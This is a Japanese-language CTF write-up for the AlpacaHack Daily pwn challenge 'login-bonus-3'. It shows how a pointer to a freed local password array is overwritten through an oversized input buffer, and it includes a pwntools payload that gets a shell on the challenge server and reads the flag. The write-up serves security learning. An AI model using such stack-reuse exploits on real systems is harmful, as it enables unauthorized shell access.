---
title: "login-bonus-3 - AlpacaHack Daily"
category: "pwn"
subcategory: "stack"
type: "writeup"
tags: ["pwn", "alpacahack", "canary", "pie", "checksec", "login-bonus-3"]
summary: "pwn writeup for \"login-bonus-3\" from AlpacaHack Daily - techniques: alpacahack, canary, pie, checksec, login-bonus-3."
source:
  name: "baumroll0928-spec/myRepository"
  url: "https://github.com/baumroll0928-spec/myRepository/blob/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202605/d31_login-bonus-3/README.md"
ctf:
  name: "AlpacaHack Daily"
  year: 2026
  challenge: "login-bonus-3"
---

## Source

- **CTF:** AlpacaHack Daily
- **Challenge:** login-bonus-3
- **Date:** 2026-05-31
- **Repository:** [baumroll0928-spec/myRepository](https://github.com/baumroll0928-spec/myRepository)
- **Directory:** <https://github.com/baumroll0928-spec/myRepository/tree/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202605/d31_login-bonus-3>
- **File:** <https://github.com/baumroll0928-spec/myRepository/blob/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202605/d31_login-bonus-3/README.md>

---
# login-bonus-3

この問題をもって、5月中はなんと、カレンダーを全て緑色にすることができました！！

もうそろそろCTF初心者名乗るの卒業してもいいですか？ダメですね。そうですよね。はい。

## 問題

パスワードを当てられますか？

```c
#define LEN_PWD 16

void generate_password(char **password) {
  int seed;
  char secret[32] = {};
  *password = secret;

  /* Generate random password */
  getrandom(&seed, sizeof(seed), 0);
  srand(seed);
  for (size_t i = 0; i < LEN_PWD; i++)
    secret[i] = 'A' + (rand() % 26);
}

void auth(const char *password) {
  char input[256];
  input[sizeof(input) - 1] = '\0';

  /* Input password */
  write(1, "Password: ", 10);
  for (size_t i = 0; i < sizeof(input) - 1; i++) {
    if (read(0, input + i, 1) != 1 || input[i] == '\n') {
      input[i] = '\0';
      break;
    }
  }

  /* Check password */
  if (strlen(input) != LEN_PWD || strcmp(input, password)) {
    write(1, "[-] Wrong password\n", 19);
  } else {
    write(1, "[+] Success\n", 12);
    system("/bin/sh");
  }
}

int main(int argc, char **argv) {
  char *password;
  generate_password(&password);
  auth(password);
  return 0;
}
```

## 概要

`main`関数では、まず`generate_password`関数を呼び出して、ランダムなパスワードを`secret`配列に生成、ポインタ渡しのchar型ポインタ`password`にそのパスワードの先頭のアドレスを書き戻しているようです。

次に`auth`関数に先ほどの`password`を値渡しして呼び出し、入力した文字列の長さが正しい長さ(=16)と等しいか、`password`が指す文字列と同じかどうかをチェックしています。

パスワードに関する情報は全く無く、予測することは不可能なようですが、どうすれば認証を突破することができるのでしょうか？

## 方針

`generate_password`関数が書き戻すアドレスの領域が`auth`関数で再利用されることに注目する。

## 解法

`generate_password`関数がポインタ渡しの引数`password`に書き戻しているのは、ローカル変数`secret`の先頭アドレスです。

※ポインタ渡しとは、変数の値そのものではなく変数のアドレスを渡すことにより関数内でその変数を読み書きできるようにするしくみです。

普通はこんなことはしません。（私がやるなら、`main`関数側で`char password[32]`を確保すると思います。）

なぜなら、`generate_password`関数から抜けた後は、この領域は解放され他の関数によって再利用可能な状態になるからです。

意図せず壊れてしまうこともあるし、場合によっては意図的な改ざんができてしまうこともあるかもしれません。

今回の問題の場合、その直後に`auth`関数が呼び出されています。

`secret`のサイズは32、`input`のサイズは256であることから、`input`の末尾あたり、具体的には`input[224]`のあたりの位置が`secret[0]`の位置と一致する可能性が高いです。

※スタックは下方向に伸び、かつ、同一の配列の中では添え字が大きい方が上に配置されるからです。

ただ、`seed`変数のせいでズレる可能性があるので、一応確認することにします。

チェック前に`password`の内容を出力するようにプログラムを書き換えてみます。
```c
  /* Check password */
  printf("password = %s\n", password);
  if (strlen(input) != LEN_PWD || strcmp(input, password)) {
    ...
```

`checksec --file=login`でバイナリを調べたところ、Stack Canaryはあり、PIEは無しだったので、それに合わせて
```
$ gcc -no-pie -o login_debug login.c
```
などでコンパイルし、
```
$ ./login_debug
```
で実行します。

そして、入力に
```
Password: xxx...xxxABCDEFGHIJKLMNOPQRSTUVWXYZ
```
を入力してみます。（`x`は210個、全部で236文字）

すると、
```
password = OPQRSTUVWXYZ
[-] Wrong password
```
となりました。

この結果から、少なくとも`input`の入力内容によって`password`の領域を侵食できることがわかりました。

`password`が`O`(=アルファベット大文字のオー)から始まっているということは、`input`と`password`の差は、`x`の210と`A`～`N`の14を足し合わせた224ということになります。224でよかったみたいです。

パスワードは16文字でなければいけないので、入力として
```
てきとーな16文字のパスワード + NULLバイト + パディングのためのてきとーな文字207文字 + 同じパスワード
<-                                                      ここまでで224バイト ->
```
を入れてあげればよさそうですね。

こうすることで、`password`の領域の文字列を`input`の領域の文字列と同じものに強制的に書き換えることができ、`strlen`関数による長さチェックも`strcmp`による比較チェックも突破できるはずです。

```py
import pwn

HOST, PORT = "34.170.146.252", 21982
p = pwn.remote(HOST, PORT)

dummy_password = "_dummy_password_"
payload = (dummy_password + "\00" + "x"*207 + dummy_password).encode()
p.sendlineafter(b": ", payload)
p.interactive()
```
```
[x] Opening connection to 34.170.146.252 on port 21982
[x] Opening connection to 34.170.146.252 on port 21982: Trying 34.170.146.252
[+] Opening connection to 34.170.146.252 on port 21982: Done
[*] Switching to interactive mode
[+] Success
```
どうやらうまくいってシェルを取るところまでできたようです！

`Dockerfile`が配布されていないのでフラグがどこにあるかはわかりませんが、`ls`を実行すると、
```
ls
bin
boot
dev
etc
flag-0fad3b0b2eeae8a40fba5f4bbc6f200c.txt
home
...
```
めっちゃそれっぽいのがあったので、
```
cat flag*
```
でフラグを取得しました。
